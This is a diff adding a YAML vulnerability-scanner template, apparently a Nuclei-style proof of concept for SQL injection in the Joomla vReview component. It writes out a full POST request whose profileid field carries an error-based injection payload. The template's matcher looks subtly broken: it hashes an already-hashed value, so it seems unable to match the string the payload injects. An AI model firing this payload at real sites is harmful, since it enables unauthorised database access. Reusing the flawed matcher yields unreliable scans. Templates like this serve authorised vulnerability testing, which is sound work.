@@ -1,0 +1,31 @@
+id: poc-local-xray-joomla-component-vreview-sql
+
+info:
+  name: poc-local-xray-joomla-component-vreview-sql
+  author: capiton
+  severity: high
+  reference:
+    - https://www.exploit-db.com/exploits/46227
+  tags: joomla
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+  md5_r1: "{{md5(r1)}}"
+
+requests:
+  - raw:
+      - |
+        POST /index.php?option=com_vreview&task=displayReply HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5({{r1}}),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#
+    
+
+    matchers-condition: and
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,substr(md5("{{md5_r1}}"), 0, 31))
+        condition: and
